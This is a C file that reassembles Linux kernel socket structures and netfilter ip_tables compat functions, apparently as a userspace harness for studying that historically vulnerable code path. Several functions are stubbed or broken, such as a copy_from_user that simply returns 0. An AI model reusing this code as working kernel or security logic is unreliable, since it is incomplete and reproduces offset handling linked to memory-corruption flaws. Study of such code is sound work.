	#if IS_ENABLED(CONFIG_IPV6)
		struct in6_addr		skc_v6_daddr;
		struct in6_addr		skc_v6_rcv_saddr;
	#endif

		atomic64_t		skc_cookie;

		/* following fields are padding to force
		* offset(struct sock, sk_refcnt) == 128 on 64bit arches
		* assuming IPV6 is enabled. We use this padding differently
		* for different kind of 'sockets'
		*/
		union {
			unsigned long	skc_flags;
			struct sock	*skc_listener; /* request_sock */
			struct inet_timewait_death_row *skc_tw_dr; /* inet_timewait_sock */
		};
		/*
		* fields between dontcopy_begin/dontcopy_end
		* are not copied in sock_copy()
		*/
		/* private: */
		int			skc_dontcopy_begin[0];
		/* public: */
		union {
			struct hlist_node	skc_node;
			struct hlist_nulls_node skc_nulls_node;
		};
		int			skc_tx_queue_mapping;
		union {
			int		skc_incoming_cpu;
			u32		skc_rcv_wnd;
			u32		skc_tw_rcv_nxt; /* struct tcp_timewait_sock  */
		};

		atomic_t		skc_refcnt;
		/* private: */
		int                     skc_dontcopy_end[0];
		union {
			u32		skc_rxhash;
			u32		skc_window_clamp;
			u32		skc_tw_snd_nxt; /* struct tcp_timewait_sock */
		};
		/* public: */
}; //struct sock_common


/* This is the per-socket lock.  The spinlock provides a synchronization
 * between user contexts and software interrupt processing, whereas the
 * mini-semaphore synchronizes multiple users amongst themselves.
 */
typedef struct {
	spinlock_t		slock;
	int			owned;
	wait_queue_head_t	wq;
	/*
	 * We express the mutex-alike socket_lock semantics
	 * to the lock validator by explicitly managing
	 * the slock as a lock variant (in addition to
	 * the slock itself):
	 */
#ifdef CONFIG_DEBUG_LOCK_ALLOC
	struct lockdep_map dep_map;
#endif
} socket_lock_t;

typedef unsigned __bitwise__ gfp_t;
typedef u64 netdev_features_t;

typedef struct {
	/* no debug version on UP */
} arch_rwlock_t;

typedef struct {
	arch_rwlock_t raw_lock;
#ifdef CONFIG_GENERIC_LOCKBREAK
	unsigned int break_lock;
#endif
#ifdef CONFIG_DEBUG_SPINLOCK
	unsigned int magic, owner_cpu;
	void *owner;
#endif
#ifdef CONFIG_DEBUG_LOCK_ALLOC
	struct lockdep_map dep_map;
#endif
} rwlock_t;

struct timer_list {
	/*
	 * All fields that change during normal runtime grouped to the
	 * same cacheline
	 */
	struct hlist_node	entry;
	unsigned long		expires;
	void			(*function)(unsigned long);
	unsigned long		data;
	u32			flags;
	int			slack;

	#ifdef CONFIG_TIMER_STATS
		int			start_pid;
		void			*start_site;
		char			start_comm[16];
	#endif
	#ifdef CONFIG_LOCKDEP
		struct lockdep_map	lockdep_map;
#endif
}; //struct timer_list

/* unable to get the definition */
struct page{
	};//struct page

struct page_frag {
	struct page *page;
#if (BITS_PER_LONG > 32) || (PAGE_SIZE >= 65536)
	__u32 offset;
	__u32 size;
#else
	__u16 offset;
	__u16 size;
#endif
};//struct page_frag 

#ifndef __LITTLE_ENDIAN
#define __LITTLE_ENDIAN 1234
#endif

struct sock_cgroup_data {
	union {
#ifdef __LITTLE_ENDIAN
		struct {
			u8	is_data;
			u8	padding;
			u16	prioidx;
			u32	classid;
		} __packed;
#else
		struct {
			u32	classid;
			u16	prioidx;
			u8	padding;
			u8	is_data;
		} __packed;
#endif
		u64		val;
	};
}; //struct sock_cgroup_data 

/**
  *	struct sock - network layer representation of sockets
  *	@__sk_common: shared layout with inet_timewait_sock
  *	@sk_shutdown: mask of %SEND_SHUTDOWN and/or %RCV_SHUTDOWN
  *	@sk_userlocks: %SO_SNDBUF and %SO_RCVBUF settings
  *	@sk_lock:	synchronizer
  *	@sk_rcvbuf: size of receive buffer in bytes
  *	@sk_wq: sock wait queue and async head
  *	@sk_rx_dst: receive input route used by early demux
  *	@sk_dst_cache: destination cache
  *	@sk_policy: flow policy
  *	@sk_receive_queue: incoming packets
  *	@sk_wmem_alloc: transmit queue bytes committed
  *	@sk_write_queue: Packet sending queue
  *	@sk_omem_alloc: "o" is "option" or "other"
  *	@sk_wmem_queued: persistent queue size
  *	@sk_forward_alloc: space allocated forward
  *	@sk_napi_id: id of the last napi context to receive data for sk
  *	@sk_ll_usec: usecs to busypoll when there is no data
  *	@sk_allocation: allocation mode
  *	@sk_pacing_rate: Pacing rate (if supported by transport/packet scheduler)
  *	@sk_max_pacing_rate: Maximum pacing rate (%SO_MAX_PACING_RATE)
  *	@sk_sndbuf: size of send buffer in bytes
  *	@sk_no_check_tx: %SO_NO_CHECK setting, set checksum in TX packets
  *	@sk_no_check_rx: allow zero checksum in RX packets
  *	@sk_route_caps: route capabilities (e.g. %NETIF_F_TSO)
  *	@sk_route_nocaps: forbidden route capabilities (e.g NETIF_F_GSO_MASK)
  *	@sk_gso_type: GSO type (e.g. %SKB_GSO_TCPV4)
  *	@sk_gso_max_size: Maximum GSO segment size to build
  *	@sk_gso_max_segs: Maximum number of GSO segments
  *	@sk_lingertime: %SO_LINGER l_linger setting
  *	@sk_backlog: always used with the per-socket spinlock held
  *	@sk_callback_lock: used with the callbacks in the end of this struct
  *	@sk_error_queue: rarely used
  *	@sk_prot_creator: sk_prot of original sock creator (see ipv6_setsockopt,
  *			  IPV6_ADDRFORM for instance)
  *	@sk_err: last error
  *	@sk_err_soft: errors that don't cause failure but are the cause of a
  *		      persistent failure not just 'timed out'
  *	@sk_drops: raw/udp drops counter
  *	@sk_ack_backlog: current listen backlog
  *	@sk_max_ack_backlog: listen backlog set in listen()
  *	@sk_priority: %SO_PRIORITY setting
  *	@sk_type: socket type (%SOCK_STREAM, etc)
  *	@sk_protocol: which protocol this socket belongs in this network family
  *	@sk_peer_pid: &struct pid for this socket's peer
  *	@sk_peer_cred: %SO_PEERCRED setting
  *	@sk_rcvlowat: %SO_RCVLOWAT setting
  *	@sk_rcvtimeo: %SO_RCVTIMEO setting
  *	@sk_sndtimeo: %SO_SNDTIMEO setting
  *	@sk_txhash: computed flow hash for use on transmit
  *	@sk_filter: socket filtering instructions
  *	@sk_timer: sock cleanup timer
  *	@sk_stamp: time stamp of last packet received
  *	@sk_tsflags: SO_TIMESTAMPING socket options
  *	@sk_tskey: counter to disambiguate concurrent tstamp requests
  *	@sk_socket: Identd and reporting IO signals
  *	@sk_user_data: RPC layer private data
  *	@sk_frag: cached page frag
  *	@sk_peek_off: current peek_offset value
  *	@sk_send_head: front of stuff to transmit
  *	@sk_security: used by security modules
  *	@sk_mark: generic packet mark
  *	@sk_cgrp_data: cgroup data for this cgroup
  *	@sk_memcg: this socket's memory cgroup association
  *	@sk_write_pending: a write to stream socket waits to start
  *	@sk_state_change: callback to indicate change in the state of the sock
  *	@sk_data_ready: callback to indicate there is data to be processed
  *	@sk_write_space: callback to indicate there is bf sending space available
  *	@sk_error_report: callback to indicate errors (e.g. %MSG_ERRQUEUE)
  *	@sk_backlog_rcv: callback to process the backlog
  *	@sk_destruct: called at sock freeing time, i.e. when all refcnt == 0
  *	@sk_reuseport_cb: reuseport group container
 */
struct sock {
	/*
	 * Now struct inet_timewait_sock also uses sock_common, so please just
	 * don't add nothing before this first member (__sk_common) --acme
	 */
	struct sock_common	__sk_common;
	#define sk_node			__sk_common.skc_node
	#define sk_nulls_node		__sk_common.skc_nulls_node
	#define sk_refcnt		__sk_common.skc_refcnt
	#define sk_tx_queue_mapping	__sk_common.skc_tx_queue_mapping

	#define sk_dontcopy_begin	__sk_common.skc_dontcopy_begin
	#define sk_dontcopy_end		__sk_common.skc_dontcopy_end
	#define sk_hash			__sk_common.skc_hash
	#define sk_portpair		__sk_common.skc_portpair
	#define sk_num			__sk_common.skc_num
	#define sk_dport		__sk_common.skc_dport
	#define sk_addrpair		__sk_common.skc_addrpair
	#define sk_daddr		__sk_common.skc_daddr
	#define sk_rcv_saddr		__sk_common.skc_rcv_saddr
	#define sk_family		__sk_common.skc_family
	#define sk_state		__sk_common.skc_state
	#define sk_reuse		__sk_common.skc_reuse
	#define sk_reuseport		__sk_common.skc_reuseport
	#define sk_ipv6only		__sk_common.skc_ipv6only
	#define sk_net_refcnt		__sk_common.skc_net_refcnt
	#define sk_bound_dev_if		__sk_common.skc_bound_dev_if
	#define sk_bind_node		__sk_common.skc_bind_node
	#define sk_prot			__sk_common.skc_prot
	#define sk_net			__sk_common.skc_net
	#define sk_v6_daddr		__sk_common.skc_v6_daddr
	#define sk_v6_rcv_saddr	__sk_common.skc_v6_rcv_saddr
	#define sk_cookie		__sk_common.skc_cookie
	#define sk_incoming_cpu		__sk_common.skc_incoming_cpu
	#define sk_flags		__sk_common.skc_flags
	#define sk_rxhash		__sk_common.skc_rxhash

		socket_lock_t		sk_lock;
		struct sk_buff_head	sk_receive_queue;
		/*
		* The backlog queue is special, it is always used with
		* the per-socket spinlock held and requires low latency
		* access. Therefore we special case it's implementation.
		* Note : rmem_alloc is in this structure to fill a hole
		* on 64bit arches, not because its logically part of
		* backlog.
		*/
		struct {
			atomic_t	rmem_alloc;
			int		len;
			struct sk_buff	*head;
			struct sk_buff	*tail;
		} sk_backlog;
	#define sk_rmem_alloc sk_backlog.rmem_alloc
		int			sk_forward_alloc;

		__u32			sk_txhash;
	#ifdef CONFIG_NET_RX_BUSY_POLL
		unsigned int		sk_napi_id;
		unsigned int		sk_ll_usec;
	#endif
		atomic_t		sk_drops;
		int			sk_rcvbuf;

		struct sk_filter __rcu	*sk_filter;
		union {
			struct socket_wq __rcu	*sk_wq;
			struct socket_wq	*sk_wq_raw;
		};
	#ifdef CONFIG_XFRM
		struct xfrm_policy __rcu *sk_policy[2];
	#endif
		struct dst_entry	*sk_rx_dst;
		struct dst_entry __rcu	*sk_dst_cache;
		/* Note: 32bit hole on 64bit arches */
		atomic_t		sk_wmem_alloc;
		atomic_t		sk_omem_alloc;
		int			sk_sndbuf;
		struct sk_buff_head	sk_write_queue;
		kmemcheck_bitfield_begin(flags);
		unsigned int		sk_shutdown  : 2,
					sk_no_check_tx : 1,
					sk_no_check_rx : 1,
					sk_userlocks : 4,
					sk_protocol  : 8,
					sk_type      : 16;
	#define SK_PROTOCOL_MAX U8_MAX
		kmemcheck_bitfield_end(flags);
		int			sk_wmem_queued;
		gfp_t			sk_allocation;
		u32			sk_pacing_rate; /* bytes per second */
		u32			sk_max_pacing_rate;
		netdev_features_t	sk_route_caps;
		netdev_features_t	sk_route_nocaps;
		int			sk_gso_type;
		unsigned int		sk_gso_max_size;
		u16			sk_gso_max_segs;
		int			sk_rcvlowat;
		unsigned long	        sk_lingertime;
		struct sk_buff_head	sk_error_queue;
		struct proto		*sk_prot_creator;
		rwlock_t		sk_callback_lock;
		int			sk_err,
					sk_err_soft;
		u32			sk_ack_backlog;
		u32			sk_max_ack_backlog;
		__u32			sk_priority;
		__u32			sk_mark;
		struct pid		*sk_peer_pid;
		const struct cred	*sk_peer_cred;
		long			sk_rcvtimeo;
		long			sk_sndtimeo;
		struct timer_list	sk_timer;
		ktime_t			sk_stamp;
		u16			sk_tsflags;
		u32			sk_tskey;
		struct socket		*sk_socket;
		void			*sk_user_data;
		struct page_frag	sk_frag;
		struct sk_buff		*sk_send_head;
		__s32			sk_peek_off;
		int			sk_write_pending;
	#ifdef CONFIG_SECURITY
		void			*sk_security;
	#endif
		struct sock_cgroup_data	sk_cgrp_data;
		struct mem_cgroup	*sk_memcg;
		void			(*sk_state_change)(struct sock *sk);
		void			(*sk_data_ready)(struct sock *sk);
		void			(*sk_write_space)(struct sock *sk);
		void			(*sk_error_report)(struct sock *sk);
		int			(*sk_backlog_rcv)(struct sock *sk,
							struct sk_buff *skb);
		void                    (*sk_destruct)(struct sock *sk);
		struct sock_reuseport __rcu	*sk_reuseport_cb;
}; //struct sock

typedef enum {
	SS_FREE = 0,			/* not allocated		*/
	SS_UNCONNECTED,			/* unconnected to any socket	*/
	SS_CONNECTING,			/* in process of connecting	*/
	SS_CONNECTED,			/* connected to socket		*/
	SS_DISCONNECTING		/* in process of disconnecting	*/
} socket_state;


struct proto_ops {
	int		family;
	struct module	*owner;
	int		(*release)   (struct socket *sock);
	int		(*bind)	     (struct socket *sock,
				      struct sockaddr *myaddr,
				      int sockaddr_len);
	int		(*connect)   (struct socket *sock,
				      struct sockaddr *vaddr,
				      int sockaddr_len, int flags);
	int		(*socketpair)(struct socket *sock1,
				      struct socket *sock2);
	int		(*accept)    (struct socket *sock,
				      struct socket *newsock, int flags);
	int		(*getname)   (struct socket *sock,
				      struct sockaddr *addr,
				      int *sockaddr_len, int peer);
	unsigned int	(*poll)	     (struct file *file, struct socket *sock,
				      struct poll_table_struct *wait);
	int		(*ioctl)     (struct socket *sock, unsigned int cmd,
				      unsigned long arg);
#ifdef CONFIG_COMPAT
	int	 	(*compat_ioctl) (struct socket *sock, unsigned int cmd,
				      unsigned long arg);
#endif
	int		(*listen)    (struct socket *sock, int len);
	int		(*shutdown)  (struct socket *sock, int flags);
	int		(*setsockopt)(struct socket *sock, int level,
				      int optname, char __user *optval, unsigned int optlen);
	int		(*getsockopt)(struct socket *sock, int level,
				      int optname, char __user *optval, int __user *optlen);
#ifdef CONFIG_COMPAT
	int		(*compat_setsockopt)(struct socket *sock, int level,
				      int optname, char __user *optval, unsigned int optlen);
	int		(*compat_getsockopt)(struct socket *sock, int level,
				      int optname, char __user *optval, int __user *optlen);
#endif
	int		(*sendmsg)   (struct socket *sock, struct msghdr *m,
				      size_t total_len);
	/* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
	 */
	int		(*recvmsg)   (struct socket *sock, struct msghdr *m,
				      size_t total_len, int flags);
	int		(*mmap)	     (struct file *file, struct socket *sock,
				      struct vm_area_struct * vma);
	ssize_t		(*sendpage)  (struct socket *sock, struct page *page,
				      int offset, size_t size, int flags);
	ssize_t 	(*splice_read)(struct socket *sock,  loff_t *ppos,
				       struct pipe_inode_info *pipe, size_t len, unsigned int flags);
	int		(*set_peek_off)(struct sock *sk, int val);
}; //struct proto_ops

/**
 *  struct socket - general BSD socket
 *  @state: socket state (%SS_CONNECTED, etc)
 *  @type: socket type (%SOCK_STREAM, etc)
 *  @flags: socket flags (%SOCK_NOSPACE, etc)
 *  @ops: protocol specific socket operations
 *  @file: File back pointer for gc
 *  @sk: internal networking protocol agnostic socket representation
 *  @wq: wait queue for several uses
 */
struct socket {
	socket_state		state;

	kmemcheck_bitfield_begin(type);
	short			type;
	kmemcheck_bitfield_end(type);

	unsigned long		flags;

	struct socket_wq __rcu	*wq;

	struct file		*file;
	struct sock		*sk;
	const struct proto_ops	*ops;
}; //struct socket 

struct fdtable {
	unsigned int max_fds;
	struct file __rcu **fd;      /* current fd array */
	unsigned long *close_on_exec;
	unsigned long *open_fds;
	unsigned long *full_fds_bits;
	struct rcu_head rcu;
};//struct fdtable

#if defined __x86_64__ && !defined __ILP32__
# define __WORDSIZE	64
#else
# define __WORDSIZE	32
#define __WORDSIZE32_SIZE_ULONG		0
#define __WORDSIZE32_PTRDIFF_LONG	0
#endif

/* Not standard, but glibc defines it */
#define BITS_PER_LONG __WORDSIZE

/*
 * The default fd array needs to be at least BITS_PER_LONG,
 * as this is the granularity returned by copy_fdset().
 */
#define NR_OPEN_DEFAULT BITS_PER_LONG

/*
 * Open file table structure
 */
struct files_struct {
  /*
   * read mostly part
   */
	atomic_t count;
	bool resize_in_progress;
	wait_queue_head_t resize_wait;

	struct fdtable __rcu *fdt;
	struct fdtable fdtab;
  /*
   * written part on a separate cache line in SMP
   */
	spinlock_t file_lock ____cacheline_aligned_in_smp;
	int next_fd;
	unsigned long close_on_exec_init[1];
	unsigned long open_fds_init[1];
	unsigned long full_fds_bits_init[1];
	struct file __rcu * fd_array[NR_OPEN_DEFAULT];
};//struct files_struct

/**
 * struct xt_mtchk_param - parameters for match extensions'
 * checkentry functions
 *
 * @net:	network namespace through which the check was invoked
 * @table:	table the rule is tried to be inserted into
 * @entryinfo:	the family-specific rule data
 * 		(struct ipt_ip, ip6t_ip, arpt_arp or (note) ebt_entry)
 * @match:	struct xt_match through which this function was invoked
 * @matchinfo:	per-match data
 * @hook_mask:	via which hooks the new rule is reachable
 * Other fields as above.
 */
struct xt_mtchk_param {
	struct net *net;
	const char *table;
	const void *entryinfo;
	const struct xt_match *match;
	void *matchinfo;
	unsigned int hook_mask;
	u_int8_t family;
	bool nft_compat;
};//struct xt_mtchk_param

struct xt_table *xt_find_table_lock(struct net *net, u_int8_t af,
				    const char *name);

struct xt_tgchk_param {
	struct net *net;
	const char *table;
	const void *entryinfo;
	const struct xt_target *target;
	void *targinfo;
	unsigned int hook_mask;
	u_int8_t family;
	bool nft_compat;
};


/**
 * struct xt_mdtor_param - match destructor parameters
 * Fields as above.
 */
struct xt_mtdtor_param {
	struct net *net;
	const struct xt_match *match;
	void *matchinfo;
	u_int8_t family;
};

//////////////////////////////////////// END OF STRUCTS ////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////

/*
 * WARNING: non atomic version.
 */
static inline void
__set_bit(unsigned long nr, volatile void * addr)
{
	int *m = ((int *) addr) + (nr >> 5);

	*m |= 1 << (nr & 31);
}

static inline void sock_set_flag(struct sock *sk, enum sock_flags flag)
{
	__set_bit(flag, &sk->sk_flags);
}//sock_set_flag

/**
 * @brief 
 * 
 * @param sk 
 * @param bit 
 * @param valbool 
 */
static inline void sock_valbool_flag(struct sock *sk, int bit, int valbool)
{
	if (valbool)
		sock_set_flag(sk, bit);
	else
		sock_reset_flag(sk, bit);
}//sock_valbool_flag

/**
 * @brief Source file -- vmalloc.c (line 1720)
 * 
 * @param size 
 * @param node 
 * @param flags 
 * @return void* 
 */
static inline void *__vmalloc_node_flags(unsigned long size,
					int node, gfp_t flags)
{
	return __vmalloc_node(size, 1, flags, PAGE_KERNEL,
					node, __builtin_return_address(0));
}//__vmalloc_node_flags


/**
 * @brief Source file -- vmalloc.c (line 1736)
 * 
 *	vmalloc  -  allocate virtually contiguous memory
 *	@size:		allocation size
 *	Allocate enough pages to cover @size from the page level
 *	allocator and map them into contiguous kernel virtual space.
 *
 *	For tight control over page level allocator and protection flags
 *	use __vmalloc() instead.
 */
void *vmalloc(unsigned long size)
{
	return __vmalloc_node_flags(size, NUMA_NO_NODE,
				    GFP_KERNEL | __GFP_HIGHMEM);
}

/**
 * @brief Source file -- vmalloc.c (line 1753)
 * 
 *	vzalloc - allocate virtually contiguous memory with zero fill
 *	@size:	allocation size
 *	Allocate enough pages to cover @size from the page level
 *	allocator and map them into contiguous kernel virtual space.
 *	The memory allocated is set to zero.
 *
 *	For tight control over page level allocator and protection flags
 *	use __vmalloc() instead.
 */
void *vzalloc(unsigned long size)
{
	return __vmalloc_node_flags(size, NUMA_NO_NODE,
				GFP_KERNEL | __GFP_HIGHMEM | __GFP_ZERO);
}//vzalloc

/**
 * @brief Source file -- uaccess.h (line 404)
 * Unable to fix the definition
 * 
 * @return int 
 */
int copy_from_user(to, from, n){
  return 0;
}
/**
 * @brief  Source file -- err.h (line 28)
 * 
 * @param ptr 
 * @return long 
 */
static inline long __must_check PTR_ERR(__force const void *ptr)
{
	return (long) ptr;
}//PTR_ERR

/**
 * @brief Source file -- err.h (line 33)
 * 
 * @param ptr 
 * @return true 
 * @return false 
 */
static inline bool __must_check IS_ERR(__force const void *ptr)
{
	return IS_ERR_VALUE((unsigned long)ptr);
}//IS_ERR

/**
 * @brief Source file -- err.h (line 38)
 * 
 * @param ptr 
 * @return true 
 * @return false 
 */
static inline bool __must_check IS_ERR_OR_NULL(__force const void *ptr)
{
	return unlikely(!ptr) || IS_ERR_VALUE((unsigned long)ptr);
}//IS_ERR_OR_NULL

/**
 * @brief Source file -- x_tables.c (line 595)
 * 
 * @param target 
 * @return int 
 */
int xt_compat_target_offset(const struct xt_target *target)
{
	u_int16_t csize = target->compatsize ? : target->targetsize;
	return XT_ALIGN(target->targetsize) - COMPAT_XT_ALIGN(csize);
}//xt_compat_target_offset

/**
 * @brief Source file -- x_tables.c (line 481)
 * 
 * @param match 
 * @return int 
 */
int xt_compat_match_offset(const struct xt_match *match)
{
	u_int16_t csize = match->compatsize ? : match->matchsize;
	return XT_ALIGN(match->matchsize) - COMPAT_XT_ALIGN(csize);
}//xt_compat_match_offset

/**
 * @brief  Source file -- x_tables.c (line 420)
 * 
 * vmalloc changed to malloc
 * 
 * @param af 
 * @param offset 
 * @param delta 
 * @return int 
 */
int xt_compat_add_offset(u_int8_t af, unsigned int offset, int delta)
{
	struct xt_af *xp = &xt[af];

	if (!xp->compat_tab) {
		if (!xp->number)
			return -EINVAL;
		xp->compat_tab = vmalloc(sizeof(struct compat_delta) * xp->number);
		if (!xp->compat_tab)
			return -ENOMEM;
		xp->cur = 0;
	}

	if (xp->cur >= xp->number)
		return -EINVAL;

	if (xp->cur)
		delta += xp->compat_tab[xp->cur - 1].delta;
	xp->compat_tab[xp->cur].offset = offset;
	xp->compat_tab[xp->cur].delta = delta;
	xp->cur++;
	return 0;
}//xt_compat_add_offset

/**
 * @brief unable to define correctly {struct module, atomic_dec_if_positive(), trace_module_put(), preempt_enable()} in the software -- system call
 * 
 * Source file -- module.c (line 1100)
 * 
 * @param module 
 */
/*
void module_put(struct module *module)
{
	int ret;
	if (module) {
		preempt_disable();
		ret = atomic_dec_if_positive(&module->refcnt);
		WARN_ON(ret < 0);	/* Failed to put refcount */
/*		trace_module_put(module, _RET_IP_);
		preempt_enable();
	}
}//module_put
*/

/**
 * @brief Source file -- x_tables.c (line 488)
 * 
 * @param m 
 * @param dstptr 
 * @param size 
 * @return int 
 */
int xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
			      unsigned int *size)
{
	const struct xt_match *match = m->u.kernel.match;
	struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
	int pad, off = xt_compat_match_offset(match);
	u_int16_t msize = cm->u.user.match_size;

	m = *dstptr;
	memcpy(m, cm, sizeof(*cm));
	if (match->compat_from_user)
		match->compat_from_user(m->data, cm->data);
	else
		memcpy(m->data, cm->data, msize - sizeof(*cm));
	pad = XT_ALIGN(match->matchsize) - match->matchsize;
	if (pad > 0)
		memset(m->data + match->matchsize, 0, pad);

	msize += off;
	m->u.user.match_size = msize;

	*size += off;
	*dstptr += msize;
	return 0;
}//xt_compat_match_from_user

/**
 * @brief Source file -- ip_tables.c (line 86)
 * Helper functions
 * 
 * @param e 
 * @return struct xt_entry_target* 
 */
static inline struct xt_entry_target *
compat_ipt_get_target(struct compat_ipt_entry *e)
{
	return (void *)e + e->target_offset;
}//compat_ipt_get_target

/**
 * @brief  unable to define correctly {mutex_lock(), list_for_each_entry(), list} in the software -- system call
 * 
 * Source file -- .../netfilter/x_tables.c (line 223)
 * 
 * Find target, grabs ref.  Returns ERR_PTR() on error.
 * 
 * @param af 
 * @param name 
 * @param revision 
 * @return struct xt_target* 
 */
/*
struct xt_target *xt_find_target(u8 af, const char *name, u8 revision)
{
	
	struct xt_target *t;
	int err = -ENOENT;

	mutex_lock(&xt[af].mutex);
	list_for_each_entry(t, &xt[af].target, list) {
		if (strcmp(t->name, name) == 0) {
			if (t->revision == revision) {
				if (try_module_get(t->me)) {
					mutex_unlock(&xt[af].mutex);
					return t;
				}
			} else
				err = -EPROTOTYPE; /* Found something. */
/*		}
	}
	mutex_unlock(&xt[af].mutex);

	if (af != NFPROTO_UNSPEC)
		/* Try searching again in the family-independent list */
/*		return xt_find_target(NFPROTO_UNSPEC, name, revision);
	

	return ERR_PTR(err);
}//xt_find_target
*/

/**
 * @brief Source file -- .../netfilter/x_tables.c (line 250)
 * 
 * @param af 
 * @param name 
 * @param revision 
 * @return struct xt_target* 
 */
struct xt_target *xt_request_find_target(u8 af, const char *name, u8 revision)
{
	struct xt_target *target;
	
	target = xt_find_target(af, name, revision);
	if (IS_ERR(target)) {
		request_module("%st_%s", xt_prefix[af], name);
		target = xt_find_target(af, name, revision);
	}
	
	return target;
}//xt_request_find_target

/**
 * @brief unable to define correctly {might_sleep(), __mutex_unlock_slowpath} in the software -- system call
 * 
 * Source file -- mutex.c (line 95)
 *
 * mutex_lock - acquire the mutex
 * @lock: the mutex to be acquired
 *
 * Lock the mutex exclusively for this task. If the mutex is not
 * available right now, it will sleep until it can get it.
 *
 * The mutex must later on be released by the same task that
 * acquired it. Recursive locking is not allowed. The task
 * may not exit without first unlocking the mutex. Also, kernel
 * memory where the mutex resides must not be freed with
 * the mutex still locked. The mutex must first be initialized
 * (or statically defined) before it can be locked. memset()-ing
 * the mutex to 0 is not allowed.
 *
 * ( The CONFIG_DEBUG_MUTEXES .config option turns on debugging
 *   checks that will enforce the restrictions and will also do
 *   deadlock debugging. )
 *
 * This function is similar to (but not equivalent to) down().
 */
/*
void __sched mutex_lock(struct mutex *lock)
{
	might_sleep();
	/*
	 * The locking fastpath is the 1->0 transition from
	 * 'unlocked' into 'locked' state.
	 */
/*	__mutex_fastpath_lock(&lock->count, __mutex_lock_slowpath);
	mutex_set_owner(lock);
}//mutex_lock
*/



/**
 * @brief unable to define correctly {__mutex_unlock_slowpath} in the software -- system call
 * 
 * Source file -- mutex.c (line 423)
 * 
 * mutex_unlock - release the mutex
 * @lock: the mutex to be released
 *
 * Unlock a mutex that has been locked by this task previously.
 *
 * This function must not be used in interrupt context. Unlocking
 * of a not locked mutex is not allowed.
 *
 * This function is similar to (but not equivalent to) up().
 */
/*
void __sched mutex_unlock(struct mutex *lock)
{
	/*
	 * The unlocking fastpath is the 0->1 transition from 'locked'
	 * into 'unlocked' state:
	 */
/* #ifndef CONFIG_DEBUG_MUTEXES
	/*
	 * When debugging is enabled we must not clear the owner before time,
	 * the slow path will always be taken, and that clears the owner field
	 * after verifying that it was indeed current.
	 */
/*	mutex_clear_owner(lock);
/* #endif
	__mutex_fastpath_unlock(&lock->count, __mutex_unlock_slowpath);
}//mutex_unlock
*/


/**
 * @brief Source file -- .../netfilter/x_tables.c (line 751)
 * unable to define CONFIG_COMPAT
 * 
 * @param af 
 */
//#ifdef CONFIG_COMPAT
void xt_compat_lock(u_int8_t af)
{
	mutex_lock(&xt[af].compat_mutex);
}//xt_compat_lock

/**
 * @brief Source file -- .../netfilter/x_tables.c (line 757)
 * 
 * @param af 
 */
void xt_compat_unlock(u_int8_t af)
{
	mutex_unlock(&xt[af].compat_mutex);
}//xt_compat_unlock
//#endif

/**
 * @brief Source file -- ip_tables.c (line 139)
 * 
 * @param ip 
 * @return true 
 * @return false 
 */
static bool
ip_checkentry(const struct ipt_ip *ip)
{
	if (ip->flags & ~IPT_F_MASK) {
		printf("Unknown flag bits set: %08X\n",
			 ip->flags & ~IPT_F_MASK);
		return false;
	}
	if (ip->invflags & ~IPT_INV_MASK) {
		printf("Unknown invflag bits set: %08X\n",
			 ip->invflags & ~IPT_INV_MASK);
		return false;
	}
	return true;
}//ip_checkentry

/**
 * @brief Source file -- ip_tables.c (line 182)
 * for const-correctness
 * 
 * @param e 
 * @return const struct xt_entry_target* 
 */
static inline const struct xt_entry_target *ipt_get_target_c(const struct ipt_entry *e)
{
	return ipt_get_target((struct ipt_entry *)e);
}//ipt_get_target_c

/**
 * @brief Source file -- ip_tables.c (line 571)
 * 
 * @param e 
 * @return int 
 */
static int check_entry(const struct ipt_entry *e)
{
	const struct xt_entry_target *t;

	if (!ip_checkentry(&e->ip))
		return -EINVAL;

	if (e->target_offset + sizeof(struct xt_entry_target) >
	    e->next_offset)
		return -EINVAL;

	t = ipt_get_target_c(e);
	if (e->target_offset + t->u.target_size > e->next_offset)
		return -EINVAL;

	return 0;
}//check_entry

/**
 * @brief Source file -- .../netfilter/x_tables.c (line 208) 
 * 
 * @param nfproto 
 * @param name 
 * @param revision 
 * @return struct xt_match* 
 */
struct xt_match * xt_request_find_match(uint8_t nfproto, const char *name, uint8_t revision)
{
	struct xt_match *match;

	match = xt_find_match(nfproto, name, revision);
	if (IS_ERR(match)) {
		request_module("%st_%s", xt_prefix[nfproto], name);
		match = xt_find_match(nfproto, name, revision);
	}
	return match;
}//xt_request_find_match

/**
 * @brief Source file -- ip_tables.c (line 1445) 
 * 
 * @param m 
 * @param name 
 * @param ip 
 * @param size 
 * @return int 
 */
static int compat_find_calc_match(struct xt_entry_match *m,
		       const char *name,
		       const struct ipt_ip *ip,
		       int *size)
{
	struct xt_match *match;

	match = xt_request_find_match(NFPROTO_IPV4, m->u.user.name,
				      m->u.user.revision);
	if (IS_ERR(match)) {
		printf("compat_check_calc_match: `%s' not found\n",
			 m->u.user.name);
		return PTR_ERR(match);
	}
	m->u.kernel.match = match;
	*size += xt_compat_match_offset(match);
	return 0;
}// compat_find_calc_match

/**
 * @brief Source file -- ip_tables.c (line 1477) 
 * 
 * @param e 
 * @param newinfo 
 * @param size 
 * @param base 
 * @param limit 
 * @param hook_entries 
 * @param underflows 
 * @param name 
 * @return int 
 */
static int check_compat_entry_size_and_hooks(struct compat_ipt_entry *e,
				  struct xt_table_info *newinfo,
				  unsigned int *size,
				  const unsigned char *base,
				  const unsigned char *limit,
				  const unsigned int *hook_entries,
				  const unsigned int *underflows,
				  const char *name)
{
	struct xt_entry_match *ematch;
	struct xt_entry_target *t;
	struct xt_target *target;
	unsigned int entry_offset;
	unsigned int j;
	int ret, off, h;

	printf("check_compat_entry_size_and_hooks %p\n", e);
	if ((unsigned long)e % __alignof__(struct compat_ipt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_ipt_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
		printf("Bad offset %p, limit = %p\n", e, limit);
		return -EINVAL;
	}

	if (e->next_offset < sizeof(struct compat_ipt_entry) +
			     sizeof(struct compat_xt_entry_target)) {
		printf("checking: element %p size %u\n",
			 e, e->next_offset);
		return -EINVAL;
	}

